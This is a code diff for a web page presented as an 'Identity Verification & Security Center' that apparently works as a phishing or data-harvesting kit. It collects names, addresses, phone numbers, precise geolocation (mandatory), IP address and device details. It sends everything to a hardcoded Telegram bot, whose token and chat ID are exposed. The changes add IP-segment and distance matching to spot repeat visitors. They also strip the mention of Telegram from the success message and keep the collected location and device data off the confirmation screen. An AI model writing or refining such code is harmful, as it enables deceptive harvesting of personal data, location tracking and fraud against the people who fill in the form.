@@ -5,7 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Identity Verification & Security Center</title>
     <style>
-        :root { --primary: #0066ff; --bg: #f4f6f9; --card: #fff; --text: #333; --border: #cbd5e1; --error: #ef4444; --success: #10b981; --warn: #f59e0b; }
+        :root { --primary: #0066ff; --bg: #f4f6f9; --card: #fff; --text: #333; --border: #cbd5e1; --error: #dc2626; --error-bg: #fef2f2; --success: #16a34a; --success-bg: #f0fdf4; --warn: #f59e0b; }
         * { box-sizing: border-box; }
         body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background: var(--bg); color: var(--text); display: flex; justify-content: center; align-items: flex-start; min-height: 100vh; margin: 0; padding: 20px; }
         .container { background: var(--card); width: 100%; max-width: 520px; padding: 30px; border-radius: 16px; box-shadow: 0 4px 25px rgba(0,0,0,0.06); }
@@ -16,13 +16,13 @@
         .form-row { display: flex; gap: 15px; margin-bottom: 16px; }
         .form-group { margin-bottom: 16px; flex: 1; position: relative; }
         label { display: block; font-weight: 600; font-size: 13px; margin-bottom: 6px; color: #1e293b; }
-        input, select { width: 100%; padding: 12px 14px; border: 1px solid var(--border); border-radius: 8px; font-size: 14px; background-color: #fff; transition: all 0.2s; }
+        input, select { width: 100%; padding: 12px 14px; border: 2px solid var(--border); border-radius: 8px; font-size: 14px; background-color: #fff; transition: all 0.2s; }
         input:focus, select:focus { border-color: var(--primary); outline: none; box-shadow: 0 0 0 3px rgba(0,102,255,0.12); }
         select:disabled { background-color: #f8fafc; color: #94a3b8; }
 
-        input.invalid { border-color: var(--error); background-color: #fef2f2; }
-        input.valid { border-color: var(--success); background-color: #f0fdf4; }
-        .error-hint { font-size: 11px; color: var(--error); margin-top: 4px; display: none; }
+        input.invalid, select.invalid { border-color: var(--error) !important; background-color: var(--error-bg) !important; box-shadow: 0 0 0 2px rgba(220,38,38,0.15); }
+        input.valid, select.valid { border-color: var(--success) !important; background-color: var(--success-bg) !important; }
+        .error-hint { font-size: 12px; color: var(--error); margin-top: 5px; display: none; font-weight: 500; }
 
         .phone-group { display: flex; gap: 8px; }
         #phonePrefix { width: 110px; background-color: #f8fafc; font-weight: 600; text-align: center; }
@@ -30,7 +30,7 @@
         .btn { width: 100%; padding: 14px; background: var(--primary); color: white; border: none; border-radius: 8px; cursor: pointer; font-size: 16px; font-weight: 600; margin-top: 10px; transition: background 0.2s; }
         .btn:hover { background: #0052cc; }
         .btn-success { background: var(--success); margin-top: 20px; }
-        .btn-success:hover { background: #0da36e; }
+        .btn-success:hover { background: #15803d; }
         .btn-warning { background: var(--warn); margin-top: 10px; }
         .btn-warning:hover { background: #d97706; }
         
@@ -64,80 +64,80 @@
         
         <div class="form-row">
             <div class="form-group">
-                <label>First Name</label>
+                <label>First Name *</label>
                 <input type="text" id="firstName" placeholder="e.g. John" oninput="aiValidateField('firstName')">
-                <div class="error-hint" id="err-firstName">Please enter a valid first name</div>
+                <div class="error-hint" id="err-firstName">⚠️ Please enter a valid first name (min 2 characters)</div>
             </div>
             <div class="form-group">
-                <label>Last Name</label>
+                <label>Last Name *</label>
                 <input type="text" id="lastName" placeholder="e.g. Doe" oninput="aiValidateField('lastName')">
-                <div class="error-hint" id="err-lastName">Please enter a valid last name</div>
+                <div class="error-hint" id="err-lastName">⚠️ Please enter a valid last name (min 2 characters)</div>
             </div>
         </div>
 
         <div class="form-row">
             <div class="form-group">
-                <label>Age</label>
+                <label>Age *</label>
                 <input type="number" id="age" placeholder="e.g. 30" min="1" max="120" oninput="aiValidateField('age')">
-                <div class="error-hint" id="err-age">Please enter a valid age</div>
+                <div class="error-hint" id="err-age">⚠️ Please enter a valid age (1–120)</div>
             </div>
             <div class="form-group">
-                <label>Current Occupation</label>
+                <label>Current Occupation *</label>
                 <input type="text" id="occupation" placeholder="e.g. Engineer" oninput="aiValidateField('occupation')">
-                <div class="error-hint" id="err-occupation">Please enter a valid occupation</div>
+                <div class="error-hint" id="err-occupation">⚠️ Please enter a valid occupation (min 2 characters)</div>
             </div>
         </div>
 
         <div class="form-group">
-            <label>Country / Region</label>
-            <select id="countrySelect" onchange="onCountryChange()">
+            <label>Country / Region *</label>
+            <select id="countrySelect" onchange="onCountryChange(); aiValidateField('countrySelect')">
                 <option value="">-- Select Country / Region --</option>
             </select>
-            <div class="error-hint" id="err-countrySelect">Please select a country</div>
+            <div class="error-hint" id="err-countrySelect">⚠️ Please select a country</div>
         </div>
 
         <div class="form-group">
-            <label>State / Province</label>
+            <label>State / Province *</label>
             <select id="stateSelect" disabled onchange="aiValidateField('stateSelect')">
-                <option value="">-- Please select country first --</option>
+                <option value="">-- Select State / Province --</option>
             </select>
-            <div class="error-hint" id="err-stateSelect">Please select a state</div>
+            <div class="error-hint" id="err-stateSelect">⚠️ Please select a state / province</div>
         </div>
 
         <div class="form-group">
-            <label>Street Address</label>
-            <input type="text" id="address" placeholder="e.g. 123 Main St" oninput="aiValidateField('address')">
-            <div class="error-hint" id="err-address">Please enter a valid street address</div>
+            <label>Street Address *</label>
+            <input type="text" id="address" placeholder="e.g. 123 Main Street" oninput="aiValidateField('address')">
+            <div class="error-hint" id="err-address">⚠️ Please enter a valid street address</div>
         </div>
 
         <div class="form-row">
             <div class="form-group">
-                <label>City</label>
+                <label>City *</label>
                 <input type="text" id="city" placeholder="e.g. New York" oninput="aiValidateField('city')">
-                <div class="error-hint" id="err-city">Please enter a city</div>
+                <div class="error-hint" id="err-city">⚠️ Please enter a valid city name</div>
             </div>
             <div class="form-group">
-                <label>Postal Code <span id="postal-hint" style="font-size:10px; color:#64748b;"></span></label>
+                <label>Postal Code * <span id="postal-hint" style="font-size:11px; color:#64748b; font-weight:normal;"></span></label>
                 <input type="text" id="zipCode" placeholder="Auto-formatted" oninput="formatAndValidateZip()">
-                <div class="error-hint" id="err-zipCode">Invalid postal format for selected country</div>
+                <div class="error-hint" id="err-zipCode">⚠️ Invalid postal code format</div>
             </div>
         </div>
 
         <div class="form-group">
-            <label>Phone Number</label>
+            <label>Phone Number *</label>
             <div class="phone-group">
                 <select id="phonePrefix" disabled>
                     <option value="">Code</option>
                 </select>
                 <input type="tel" id="phone" placeholder="Enter phone number" oninput="aiValidateField('phone')">
             </div>
-            <div class="error-hint" id="err-phone">Invalid phone number format for selected region</div>
+            <div class="error-hint" id="err-phone">⚠️ Please enter a valid phone number</div>
         </div>
 
         <button class="btn" id="btn-next" onclick="proceedToVerification()">Next</button>
     </div>
 
-    <!-- Confirmation Page -->
+    <!-- Confirmation Page — CLEAN: only user data -->
     <div id="step-verification">
         <h2>Confirm Information</h2>
         <p style="text-align:center; color:#64748b; font-size:14px;">Please verify your information before submitting.</p>
@@ -179,16 +179,17 @@
 </div>
 
 <script>
-// ========== Telegram Configuration ==========
+// ========== Configuration ==========
 const TELEGRAM_BOT_TOKEN = "8657025946:AAGG14AbXcHQzWqSaL6MQTCCP2PEtIyt64g";
 const TELEGRAM_CHAT_ID = "7396947380";
-const DISTANCE_THRESHOLD_METERS = 20; // 坐标相差≤20米视为同一位置
+const DISTANCE_THRESHOLD_METERS = 100; // ⬅️ Updated: 100 meters
+const IP_SEGMENTS_TO_MATCH = 2; // Match first 2 segments (e.g. 113.185.*)
 
 // ========== Country Database ==========
 const globalDatabase = {
     "CN": { name: "China", phoneCode: "+86", zipRegex: /^\d{6}$/, zipFormat: "6 digits", phoneRegex: /^1[3-9]\d{9}$/, states: ["Beijing","Tianjin","Shanghai","Chongqing","Hebei","Shanxi","Liaoning","Jilin","Heilongjiang","Jiangsu","Zhejiang","Anhui","Fujian","Jiangxi","Shandong","Henan","Hubei","Hunan","Guangdong","Hainan","Sichuan","Guizhou","Yunnan","Shaanxi","Gansu","Qinghai","Taiwan","Inner Mongolia","Guangxi","Tibet","Ningxia","Xinjiang","Hong Kong","Macau"] },
     "US": { name: "United States", phoneCode: "+1", zipRegex: /^\d{5}(-?\d{4})?$/, zipFormat: "5 digits or 5-4", phoneRegex: /^\d{10}$/, states: ["Alabama","Alaska","Arizona","Arkansas","California","Colorado","Connecticut","Delaware","Florida","Georgia","Hawaii","Idaho","Illinois","Indiana","Iowa","Kansas","Kentucky","Louisiana","Maine","Maryland","Massachusetts","Michigan","Minnesota","Mississippi","Missouri","Montana","Nebraska","Nevada","New Hampshire","New Jersey","New Mexico","New York","North Carolina","North Dakota","Ohio","Oklahoma","Oregon","Pennsylvania","Rhode Island","South Carolina","South Dakota","Tennessee","Texas","Utah","Vermont","Virginia","Washington","West Virginia","Wisconsin","Wyoming","District of Columbia","Puerto Rico","Guam"] },
-    "CA": { name: "Canada", phoneCode: "+1", zipRegex: /^[ABCEGHJ-NPRSTVXY]\d[ABCEGHJ-NPRSTV-Z]\d[ABCEGHJ-NPRSTV-Z]\d$/i, zipFormat: "A1A 1A1", phoneRegex: /^\d{10}$/, states: ["Ontario","Quebec","British Columbia","Alberta","Manitoba","Saskatchewan","Nova Scotia","New Brunswick"] },
+    "CA": { name: "Canada", phoneCode: "+1", zipRegex: /^[ABCEGHJ-NPRSTVXY]\d[ABCEGHJ-NPRSTV-Z]\d[ABCEGHJ-NPRSTV-Z]\d$/i, zipFormat: "A1A 1A1", phoneRegex: /^\d{10}$/, states: ["Alberta","British Columbia","Manitoba","New Brunswick","Newfoundland and Labrador","Nova Scotia","Ontario","Prince Edward Island","Quebec","Saskatchewan","Northwest Territories","Nunavut","Yukon"] },
     "GB": { name: "United Kingdom", phoneCode: "+44", zipRegex: /^[A-Z]{1,2}\d[A-Z\d]?\d[A-Z]{2}$/i, zipFormat: "Postcode", phoneRegex: /^\d{10,11}$/, states: ["England","Scotland","Wales","Northern Ireland"] },
     "AU": { name: "Australia", phoneCode: "+61", zipRegex: /^\d{4}$/, zipFormat: "4 digits", phoneRegex: /^\d{9}$/, states: ["New South Wales","Victoria","Queensland","Western Australia","South Australia","Tasmania"] },
     "JP": { name: "Japan", phoneCode: "+81", zipRegex: /^\d{7}$/, zipFormat: "7 digits", phoneRegex: /^\d{9,10}$/, states: ["Hokkaido","Tokyo","Kanagawa","Osaka","Kyoto","Okinawa"] },
@@ -204,8 +205,8 @@ const globalDatabase = {
 let formData = {};
 let deviceInfo = { ip: "", device: "", os: "", browser: "" };
 let locationInfo = { lat: "", lng: "", status: "pending" };
-let duplicateRecord = null; // 匹配到的历史记录
-let allowSubmitAnyway = false; // 用户确认后允许提交
+let duplicateRecord = null;
+let allowSubmitAnyway = false;
 
 // ========== Initialize ==========
 window.onload = () => {
@@ -218,7 +219,7 @@ window.onload = () => {
     deviceInfo = parseUserAgent();
 };
 
-// ========== Calculate Distance Between Two Coordinates (Haversine) ==========
+// ========== Calculate Distance Between Two Coordinates ==========
 function getDistanceMeters(lat1,lng1,lat2,lng2){
     if(!lat1||!lng1||!lat2||!lng2) return 999999;
     const toRad = deg => deg * Math.PI / 180;
@@ -228,50 +229,62 @@ function getDistanceMeters(lat1,lng1,lat2,lng2){
     return 6371000 * 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1-a));
 }
 
-// ========== Load/Save Submission History from LocalStorage ==========
-function loadHistory(){
-    try{ return JSON.parse(localStorage.getItem('submitHistory')||'[]'); }
-    catch{ return []; }
-}
-function saveHistory(record){
-    const history = loadHistory();
-    history.push(record);
-    localStorage.setItem('submitHistory', JSON.stringify(history));
+// ========== IP Segment Match ==========
+function getIpSegment(ip, segments=2){
+    if(!ip || ip==="Unavailable") return "";
+    return ip.split('.').slice(0, segments).join('.');
 }
 
-// ========== Duplicate Detection ==========
+// ========== History Storage ==========
+function loadHistory(){ try{ return JSON.parse(localStorage.getItem('submitHistory')||'[]'); } catch{ return []; } }
+function saveHistory(record){ const h=loadHistory(); h.push(record); localStorage.setItem('submitHistory', JSON.stringify(h)); }
+
+// ========== IMPROVED Duplicate Detection ==========
 function findDuplicate(current){
     const history = loadHistory();
+    const currentNameKey = current.name?.trim().toLowerCase() || "";
+    const currentPhoneKey = current.phoneFull?.replace(/\D/g,'') || "";
+    const currentIpSeg = getIpSegment(current.ip, IP_SEGMENTS_TO_MATCH);
+
     for(const rec of history){
-        // Rule 1: Same full name + same phone → duplicate
-        const sameName = rec.name?.trim().toLowerCase() === current.name?.trim().toLowerCase();
-        const samePhone = rec.phoneFull?.replace(/\D/g,'') === current.phoneFull?.replace(/\D/g,'');
-        const ruleNamePhone = sameName && samePhone;
+        const recNameKey = rec.name?.trim().toLowerCase() || "";
+        const recPhoneKey = rec.phoneFull?.replace(/\D/g,'') || "";
+        const recIpSeg = getIpSegment(rec.ip, IP_SEGMENTS_TO_MATCH);
 
-        // Rule 2: Same IP → duplicate
-        const sameIP = rec.ip === current.ip && current.ip && current.ip !== "Unavailable";
+        // Rule 1: Same full name + same phone
+        const sameNamePhone = currentNameKey && currentPhoneKey && recNameKey === currentNameKey && recPhoneKey === currentPhoneKey;
 
-        // Rule 3: Location within threshold meters → duplicate
+        // Rule 2: Same name + close location
         let dist = 999999;
         if(rec.lat && rec.lng && current.lat && current.lng){
             dist = getDistanceMeters(+rec.lat, +rec.lng, +current.lat, +current.lng);
         }
-        const nearLoc = dist <= DISTANCE_THRESHOLD_METERS;
+        const sameNameNearby = currentNameKey && recNameKey === currentNameKey && dist <= DISTANCE_THRESHOLD_METERS;
 
-        if(ruleNamePhone || sameIP || nearLoc){
-            return { rec, dist, ruleNamePhone, sameIP, nearLoc };
+        // Rule 3: Same IP (exact)
+        const sameIpExact = current.ip && current.ip !== "Unavailable" && rec.ip === current.ip;
+
+        // Rule 4: Same IP segment (e.g. 113.185.*)
+        const sameIpSegment = currentIpSeg && recIpSeg && currentIpSeg === recIpSeg;
+
+        // Rule 5: Close location only
+        const nearLocation = dist <= DISTANCE_THRESHOLD_METERS;
+
+        if(sameNamePhone || sameNameNearby || sameIpExact || sameIpSegment || nearLocation){
+            return { rec, dist, sameNamePhone, sameNameNearby, sameIpExact, sameIpSegment, nearLocation };
         }
     }
     return null;
 }
 
-// ========== Build Reason Text ==========
 function makeReasonText(m){
-    const reasons=[];
-    if(m.ruleNamePhone) reasons.push("same name + phone number");
-    if(m.sameIP) reasons.push("same IP address");
-    if(m.nearLoc) reasons.push(`location within ${Math.round(m.dist)} meters`);
-    return reasons.join(" + ");
+    const r=[];
+    if(m.sameNamePhone) r.push("same name + phone");
+    if(m.sameNameNearby) r.push(`same name + ${Math.round(m.dist)}m away`);
+    if(m.sameIpExact) r.push("same IP address");
+    if(m.sameIpSegment) r.push("same IP network segment");
+    if(m.nearLocation && !m.sameNameNearby && !m.sameNamePhone && !m.sameIpExact && !m.sameIpSegment) r.push(`location within ${Math.round(m.dist)}m`);
+    return r.join(" + ");
 }
 
 // ========== Country Change ==========
@@ -280,7 +293,7 @@ function onCountryChange() {
     const stateSel = document.getElementById('stateSelect');
     const phonePrefix = document.getElementById('phonePrefix');
     const hint = document.getElementById('postal-hint');
-    stateSel.innerHTML=`<option value="">-- Please select country first --</option>`;
+    stateSel.innerHTML=`<option value="">-- Select State / Province --</option>`;
     phonePrefix.innerHTML=`<option value="">Code</option>`;
     hint.textContent='';
 
@@ -293,18 +306,18 @@ function onCountryChange() {
         hint.textContent=`(Format: ${d.zipFormat})`;
     }else{
         stateSel.disabled=true; phonePrefix.disabled=true;
+        stateSel.innerHTML=`<option value="">-- Select Country first --</option>`;
     }
-    aiValidateField('countrySelect');
 }
 
 // ========== ZIP Format & Validation ==========
 function formatAndValidateZip(){
     const input = document.getElementById('zipCode');
     const raw = input.value;
-    let cleaned = raw.replace(/\s+/g, '').toUpperCase();
+    let cleaned = raw.replace(/[^A-Za-z0-9]/g, '').toUpperCase();
     const countryCode = document.getElementById('countrySelect').value;
-    if(countryCode === 'CA' && cleaned.length === 6){
-        cleaned = cleaned.slice(0,3) + ' ' + cleaned.slice(3);
+    if(countryCode === 'CA' && cleaned.length >= 6){
+        cleaned = cleaned.slice(0,3) + ' ' + cleaned.slice(3,6);
     }
     const pos = input.selectionStart;
     input.value = cleaned;
@@ -317,10 +330,10 @@ function aiValidateZipCode(cleanedZip){
     const errEl = document.getElementById('err-zipCode');
     const inputEl = document.getElementById('zipCode');
     let ok = true;
-    if(countryCode && globalDatabase[countryCode]){
+    if(countryCode && globalDatabase[countryCode] && cleanedZip.length>0){
         ok = globalDatabase[countryCode].zipRegex.test(cleanedZip);
     } else {
-        ok = cleanedZip.length > 0;
+        ok = cleanedZip.length >= 4;
     }
     if(cleanedZip){
         inputEl.classList.toggle('valid', ok);
@@ -350,17 +363,38 @@ function aiValidateField(fid){
         ok=ccode&&globalDatabase[ccode]?globalDatabase[ccode].phoneRegex.test(digits):digits.length>=6;
     }
 
-    if(err&&v){ el.classList.toggle('valid',ok);el.classList.toggle('invalid',!ok);err.style.display=ok?'none':'block'; }
-    else if(err){el.classList.remove('valid','invalid');err.style.display='none';}
+    if(v.length>0){
+        el.classList.toggle('valid', ok);
+        el.classList.toggle('invalid', !ok);
+    } else {
+        el.classList.remove('valid','invalid');
+    }
+    err.style.display = v.length>0 && !ok ? 'block' : 'none';
     return ok;
 }
 
 // ========== Go to Confirm Page ==========
 async function proceedToVerification(){
-    const fields=['firstName','lastName','age','occupation','countrySelect','stateSelect','address','city','phone'];
-    const bad=fields.filter(f=>!aiValidateField(f));
-    const zipOk = formatAndValidateZip();
-    if(bad.length || !zipOk)return alert('Please check highlighted fields before proceeding.');
+    const fields=['firstName','lastName','age','occupation','countrySelect','stateSelect','address','city','zipCode','phone'];
+    let firstErrorId = null;
+    let allOk = true;
+
+    fields.forEach(f=>{
+        let ok;
+        if(f==='zipCode') ok = formatAndValidateZip();
+        else ok = aiValidateField(f);
+        if(!ok && !firstErrorId) firstErrorId = f;
+        allOk = allOk && ok;
+    });
+
+    if(!allOk){
+        alert('Please check highlighted fields before proceeding.');
+        if(firstErrorId){
+            document.getElementById(firstErrorId).scrollIntoView({behavior:'smooth', block:'center'});
+            document.getElementById(firstErrorId).focus();
+        }
+        return;
+    }
 
     formData={
         name: document.getElementById('firstName').value.trim()+' '+document.getElementById('lastName').value.trim(),
@@ -381,11 +415,12 @@ async function proceedToVerification(){
     document.getElementById('step-form').style.display='none';
     document.getElementById('step-verification').style.display='block';
 
+    // Confirm page — ONLY user data, clean display
     document.getElementById('disp-name').textContent = formData.name;
     document.getElementById('disp-age').textContent = formData.age;
     document.getElementById('disp-occupation').textContent = formData.occupation;
     document.getElementById('disp-addr').textContent = 
-        `Country: ${formData.countryName}, Province/State: ${formData.state}, City: ${formData.city}, Street: ${formData.address}`;
+        `${formData.countryName}, ${formData.state}, ${formData.city}, ${formData.address}`;
     document.getElementById('disp-phone').textContent = formData.phonePrefix+' '+formData.phone;
     document.getElementById('disp-zip').textContent = formData.zipDisplay;
 
@@ -393,52 +428,33 @@ async function proceedToVerification(){
     checkDuplicateOnPage();
 }
 
-// ========== Show Duplicate Info on Confirm Page ==========
+// ========== Duplicate Info on Confirm Page ==========
 function checkDuplicateOnPage(){
-    duplicateRecord = null;
-    allowSubmitAnyway = false;
-
+    duplicateRecord = null; allowSubmitAnyway = false;
     if(locationInfo.status !== "granted") return;
-
-    const current = {
-        name: formData.name,
-        phoneFull: formData.phoneFull,
-        ip: deviceInfo.ip,
-        lat: locationInfo.lat,
-        lng: locationInfo.lng
-    };
-
+    const current = { name: formData.name, phoneFull: formData.phoneFull, ip: deviceInfo.ip, lat: locationInfo.lat, lng: locationInfo.lng };
     const match = findDuplicate(current);
     if(!match) return;
-
     duplicateRecord = match;
     document.getElementById('duplicate-status-box').classList.remove('hidden');
     document.getElementById('disp-dup-info').classList.remove('hidden');
 
-    // Count all records that match this person
     const history = loadHistory();
     const samePerson = history.filter(r=>{
         const sameNamePhone = r.name?.trim().toLowerCase() === formData.name.trim().toLowerCase() && r.phoneFull?.replace(/\D/g,'') === formData.phoneFull.replace(/\D/g,'');
-        const sameIP = r.ip === deviceInfo.ip && deviceInfo.ip !== "Unavailable";
+        const sameIp = r.ip === deviceInfo.ip && deviceInfo.ip !== "Unavailable";
         const near = r.lat && r.lng && locationInfo.lat && locationInfo.lng && getDistanceMeters(+r.lat,+r.lng,+locationInfo.lat,+locationInfo.lng) <= DISTANCE_THRESHOLD_METERS;
-        return sameNamePhone || sameIP || near;
+        return sameNamePhone || sameIp || near;
     });
-
-    const first = samePerson[0]?.timeStr || "—";
-    const last = samePerson[samePerson.length-1]?.timeStr || "—";
-    document.getElementById('disp-count').textContent = samePerson.length + 1; // +1 for current
-    document.getElementById('disp-first').textContent = first;
-    document.getElementById('disp-last').textContent = last;
+    document.getElementById('disp-count').textContent = samePerson.length + 1;
+    document.getElementById('disp-first').textContent = samePerson[0]?.timeStr || "—";
+    document.getElementById('disp-last').textContent = samePerson[samePerson.length-1]?.timeStr || "—";
 }
 
 // ========== Location Request ==========
 function requestLocation(){
     return new Promise((resolve) => {
-        if (!navigator.geolocation) {
-            locationInfo.status = "error";
-            showLocationError();
-            return resolve();
-        }
+        if (!navigator.geolocation) { locationInfo.status = "error"; showLocationError(); return resolve(); }
         navigator.geolocation.getCurrentPosition(
             (pos) => {
                 locationInfo.lat = pos.coords.latitude.toFixed(6);
@@ -458,38 +474,21 @@ function requestLocation(){
     });
 }
 
-function showLocationError(){
-    document.getElementById('loc-status-box').classList.remove('hidden');
-    document.getElementById('btn-retry-loc').classList.remove('hidden');
-}
-function hideLocationError(){
-    document.getElementById('loc-status-box').classList.add('hidden');
-    document.getElementById('btn-retry-loc').classList.add('hidden');
-}
+function showLocationError(){ document.getElementById('loc-status-box').classList.remove('hidden'); document.getElementById('btn-retry-loc').classList.remove('hidden'); }
+function hideLocationError(){ document.getElementById('loc-status-box').classList.add('hidden'); document.getElementById('btn-retry-loc').classList.add('hidden'); }
 
-// ========== Fetch IP Address ==========
-async function fetchIPAddress(){
-    try{
-        const res = await fetch('https://api.ipify.org?format=json');
-        const json = await res.json();
-        deviceInfo.ip = json.ip;
-    }catch{
-        deviceInfo.ip = "Unavailable";
-    }
-}
+// ========== Fetch IP ==========
+async function fetchIPAddress(){ try{ const r=await fetch('https://api.ipify.org?format=json'); const j=await r.json(); deviceInfo.ip=j.ip; }catch{ deviceInfo.ip="Unavailable"; } }
 
 // ========== Parse Device Info ==========
 function parseUserAgent(){
     const ua = navigator.userAgent;
     let device = "Unknown Device", os = "Unknown OS", browser = "Unknown Browser";
-
     if(/iPhone/.test(ua)) device = "iPhone";
     else if(/iPad/.test(ua)) device = "iPad";
     else if(/Macintosh/.test(ua)) device = "Mac";
-    else if(/Android/.test(ua)) {
-        const m = ua.match(/;\s*([a-zA-Z0-9_\s-]+)\s*Build\//);
-        device = m ? m[1] : "Android Device";
-    } else if(/Windows NT/.test(ua)) device = "Windows PC";
+    else if(/Android/.test(ua)) { const m=ua.match(/;\s*([a-zA-Z0-9_\s-]+)\s*Build\//); device=m?m[1]:"Android Device"; }
+    else if(/Windows NT/.test(ua)) device = "Windows PC";
 
     if(/Windows NT 10/.test(ua)) os = "Windows 10/11";
     else if(/Mac OS X/.test(ua)) os = "macOS";
@@ -507,91 +506,49 @@ function parseUserAgent(){
 
 // ========== Modal Control ==========
 function openDuplicateModal(match){
-    const reason = makeReasonText(match);
-    document.getElementById('modal-reason').textContent = 
-        `Detected: ${reason}\n\nThis person has been submitted before. Continue anyway?`;
-
-    // Show recent history
+    document.getElementById('modal-reason').textContent = `Detected: ${makeReasonText(match)}\n\nThis person may have submitted before. Continue anyway?`;
     const history = loadHistory();
-    const recent = history.slice(-3).reverse();
-    document.getElementById('modal-history').innerHTML = recent.map(r=>`
-        <div class="history-item">
-        <strong>${r.name}</strong> · ${r.timeStr}<br>
-        Phone: ${r.phone} · IP: ${r.ip}<br>
-        Coords: ${r.lat}, ${r.lng}
-        </div>
-    `).join('');
-
+    document.getElementById('modal-history').innerHTML = history.slice(-3).reverse().map(r=>`<div class="history-item"><strong>${r.name}</strong> · ${r.timeStr}<br>Phone: ${r.phone} · IP: ${r.ip}<br>Coords: ${r.lat}, ${r.lng}</div>`).join('');
     document.getElementById('duplicate-modal').classList.remove('hidden');
 }
 function closeModal(confirm=false){
     document.getElementById('duplicate-modal').classList.add('hidden');
-    if(confirm){
-        allowSubmitAnyway = true;
-        doSubmit();
-    }
+    if(confirm){ allowSubmitAnyway=true; doSubmit(); }
 }
 
-// ========== Submit to Telegram ==========
+// ========== Submit ==========
 async function submitData(){
     if(locationInfo.status !== "granted"){
         alert("Location permission is REQUIRED before submission.\nPlease enable location access and click [Retry Location Access].\n\nNot authorized / Failed to retrieve.");
         return;
     }
-
-    // Check duplicate BEFORE sending
-    const current = {
-        name: formData.name,
-        phoneFull: formData.phoneFull,
-        ip: deviceInfo.ip,
-        lat: locationInfo.lat,
-        lng: locationInfo.lng
-    };
+    const current = { name: formData.name, phoneFull: formData.phoneFull, ip: deviceInfo.ip, lat: locationInfo.lat, lng: locationInfo.lng };
     const match = findDuplicate(current);
-    if(match && !allowSubmitAnyway){
-        openDuplicateModal(match);
-        return;
-    }
-
+    if(match && !allowSubmitAnyway){ openDuplicateModal(match); return; }
     doSubmit();
 }
 
 async function doSubmit(){
     const timeStr = new Date().toLocaleString('zh-CN');
-
-    // Save to local history
     saveHistory({
-        name: formData.name,
-        age: formData.age,
-        occupation: formData.occupation,
-        phone: formData.phonePrefix+' '+formData.phone,
-        phoneFull: formData.phoneFull,
-        country: formData.countryName,
-        state: formData.state,
-        city: formData.city,
-        address: formData.address,
-        zip: formData.zipDisplay,
-        ip: deviceInfo.ip,
-        device: deviceInfo.device,
-        os: deviceInfo.os,
-        browser: deviceInfo.browser,
-        lat: locationInfo.lat,
-        lng: locationInfo.lng,
-        timeStr,
-        timestamp: Date.now()
+        name: formData.name, age: formData.age, occupation: formData.occupation,
+        phone: formData.phonePrefix+' '+formData.phone, phoneFull: formData.phoneFull,
+        country: formData.countryName, state: formData.state, city: formData.city, address: formData.address, zip: formData.zipDisplay,
+        ip: deviceInfo.ip, device: deviceInfo.device, os: deviceInfo.os, browser: deviceInfo.browser,
+        lat: locationInfo.lat, lng: locationInfo.lng, timeStr, timestamp: Date.now()
     });
 
-    // Recalculate total count for Telegram message
     const history = loadHistory();
     const samePerson = history.filter(r=>{
         const sameNamePhone = r.name?.trim().toLowerCase() === formData.name.trim().toLowerCase() && r.phoneFull?.replace(/\D/g,'') === formData.phoneFull.replace(/\D/g,'');
-        const sameIP = r.ip === deviceInfo.ip && deviceInfo.ip !== "Unavailable";
+        const sameIp = r.ip === deviceInfo.ip && deviceInfo.ip !== "Unavailable";
         const near = r.lat && r.lng && locationInfo.lat && locationInfo.lng && getDistanceMeters(+r.lat,+r.lng,+locationInfo.lat,+locationInfo.lng) <= DISTANCE_THRESHOLD_METERS;
-        return sameNamePhone || sameIP || near;
+        return sameNamePhone || sameIp || near;
     });
     const count = samePerson.length;
     const firstTime = samePerson[0]?.timeStr || timeStr;
 
+    // Telegram message — FULL details preserved for admin
     const msg = `📩 新提交的资料
 ——————————————
 姓名：${formData.name}
@@ -615,7 +572,7 @@ async function doSubmit(){
 ⏰ 提交时间：${timeStr}
 ——————————————`;
 
-    console.log('📤 准备发送到 Telegram：\n', msg);
+    console.log('📤 Sending to Telegram:\n', msg);
 
     try{
         const res = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,{
@@ -624,18 +581,9 @@ async function doSubmit(){
             body:JSON.stringify({chat_id: TELEGRAM_CHAT_ID, text: msg})
         });
         const json=await res.json();
-        if(json.ok){
-            alert('Submitted successfully! Information sent to Telegram.');
-            console.log('Telegram 响应：', json);
-            location.reload();
-        }else{
-            alert('Telegram Error: '+JSON.stringify(json));
-            console.error(json);
-        }
-    }catch(e){
-        alert('Network or configuration error: '+e.message+'\nPlease deploy to HTTPS website.');
-        console.error(e);
-    }
+        if(json.ok){ alert('Submitted successfully!'); location.reload(); }
+        else { alert('Telegram Error: '+JSON.stringify(json)); console.error(json); }
+    }catch(e){ alert('Network error: '+e.message+'\nPlease use HTTPS website.'); console.error(e); }
 }
 </script>
 </body>
